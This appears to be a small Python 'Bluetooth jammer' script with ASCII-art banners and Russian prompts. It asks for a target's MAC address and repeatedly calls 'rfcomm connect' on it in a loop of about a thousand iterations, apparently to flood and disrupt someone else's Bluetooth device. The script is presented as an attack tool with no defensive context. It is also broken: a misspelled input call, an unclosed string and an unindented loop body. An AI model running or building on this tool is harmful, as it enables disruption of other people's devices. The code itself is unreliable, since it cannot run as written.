#!/usr/bin/env python
print('████──█───█─█─███─███─████─████─███─█──█')
print('█──██─█───█─█─█────█──█──█─█──█──█──█──█')
print('████──█───█─█─███──█──█──█─█──█──█──████')
print('█──██─█───█─█─█────█──█──█─█──█──█──█──█')
print('████──███─███─███──█──████─████──█──█──█')
print('')
print('──██─████─█───█─█───█─███─████')
print('───█─█──█─██─██─██─██─█───█──█')
print('───█─████─█─█─█─█─█─█─███─████')
print('█──█─█──█─█───█─█───█─█───█─█')
print('████─█──█─█───█─█───█─███─█─█')
print('')
print(']]]]]..]]..]]')
print(']]..]]..]]]]')
print(']]]]]....]]')
print(']]..]]...]]')
print(']]]]]....]]')
print('')
print(']]..]].]]]]]..]]]]]...]]]]...]]]]..]]..]].]]]]]..]]]]]')
print(']]..]].]].....]]..]].]].....]]..]].]].]]..]].....]]..]]')
print(']]..]].]]]]...]]]]]...]]]]..]]]]]].]]]]...]]]]...]]]]]')
print('.]]]]..]].....]]..]].....]].]]..]].]].]]..]].....]]..]]')
print('..]]...]]]]]..]]..]]..]]]]..]]..]].]]..]].]]]]]..]]..]]')
print('')
print(']]..]]....]].......]]]]')
print(']]..]]..]]]]......]]..]]')
print(']]..]]....]]......]]..]]')
print('.]]]].....]]......]]..]]')
print('..]]......]]..]]...]]]]')
print('')
print('')
print('Введите MAC адресс устройства')
import subprocess
mac=imput()
print('Одну секунду..)
cmd=['rfcomm', 'connect', mac, '1']
for i in range(0, 1001):
subprocess.call(cmd)
print('Подключение...') 
